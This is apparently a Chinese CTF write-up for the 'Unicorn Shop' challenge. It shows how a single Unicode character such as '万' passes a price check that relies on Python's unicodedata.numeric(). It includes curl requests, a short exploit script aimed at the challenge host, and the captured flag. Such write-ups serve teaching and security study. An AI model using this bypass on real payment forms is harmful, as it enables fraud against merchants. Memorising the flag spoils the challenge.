---
title: 'Unicorn Shop'
date: '2026-06-27'
modifiedTime: '2026-06-27'
intro: '一道经典的 Unicode 数字绕过题。目标是以单个字符的形式提交价格购买 Item 4 (ultra unicorn, 价格 1337.0)，利用 Python `unicodedata.numeric()` 对中文数字的支持，用 "万"'
tags: ['ctf', 'writeup', 'python', 'unicode']
cover: ''
---

# Unicorn Shop

## Summary

一道经典的 Unicode 数字绕过题。目标是以单个字符的形式提交价格购买 Item 4 (ultra unicorn, 价格 1337.0)，利用 Python `unicodedata.numeric()` 对中文数字的支持，用 "万" (数值 10000) 绕过价格校验。

## Solution

### Step 1: 信息收集

访问目标网站，发现是一个独角兽商店，有 4 件商品：

| Item ID | Price | Item |
|---------|-------|------|
| 1 | 2.0 | black and white unicorn |
| 2 | 5.0 | unicorn family |
| 3 | 8.0 | warrior unicorn |
| 4 | 1337.0 | ultra unicorn |

表单提交到 `/charge`，参数为 `id` 和 `price`。

HTML 源码中有几个关键提示：
- `<!--Ah,really important,seriously. -->` 指向 `charset=utf-8`
- `<!--Don't be frustrated by the same view,we've changed the challenge content.-->`

### Step 2: 测试价格限制

直接提交正常价格 `2.0` 购买 Item 1：

```bash
curl -s -X POST "https://target/charge" -d "id=1&price=2.0"
```

返回：
```
Only one char(?) allowed!
```

**关键发现**：价格字段只接受**一个字符**。

### Step 3: 利用 Unicode 数字绕过

Python 的 `unicodedata.numeric()` 可以将 Unicode 字符转换为数值。中文数字 "万" 的数值为 10000，满足 `>= 1337` 的条件。

```python
import unicodedata
print(unicodedata.numeric('万'))  # 10000.0
print(unicodedata.numeric('亿'))  # 100000000.0
```

发送请求：

```bash
curl -s -X POST "https://target/charge" -d "id=4&price=万"
```

返回：
```
操作成功。
CTF2{3a2cde8f-28df-4bd5-b1b2-25292659c734}
```

## Flag

```
CTF2{3a2cde8f-28df-4bd5-b1b2-25292659c734}
```

## Exploit Script

```python
import requests

url = "https://1c0d0685a00293f9bdc74ea7.http-ctf2.dasctf.com/charge"

# 万 = 10000.0, 亿 = 100000000.0
payload = {
    "id": "4",
    "price": "万"  # unicodedata.numeric('万') = 10000.0 > 1337.0
}

r = requests.post(url, data=payload)
print(r.text)
```

## 技术原理

| 对比项 | `float()` | `unicodedata.numeric()` |
|--------|-----------|------------------------|
| `万` | ValueError | 10000.0 |
| `亿` | ValueError | 100000000.0 |
| `④` | ValueError | 4.0 |
| `½` | ValueError | 0.5 |

服务器使用 `unicodedata.numeric()` 进行数值转换，但前端只允许单字符输入。利用中文数字字符的高位数值即可绕过价格校验。
